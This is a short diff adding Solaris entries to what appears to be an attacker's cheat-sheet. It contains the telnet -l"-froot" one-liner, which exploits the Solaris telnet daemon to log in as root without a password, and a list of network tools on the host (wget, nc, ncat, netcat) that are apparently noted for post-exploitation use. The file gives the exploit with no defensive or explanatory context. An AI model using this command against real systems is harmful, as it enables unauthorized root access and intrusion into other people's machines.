@@ -1,0 +1,7 @@
+# solaris
+
+# telnet
+telnet -l"-froot"
+
+# sfw
+/opt/sfw/bin/wget,nc,ncat,netcat
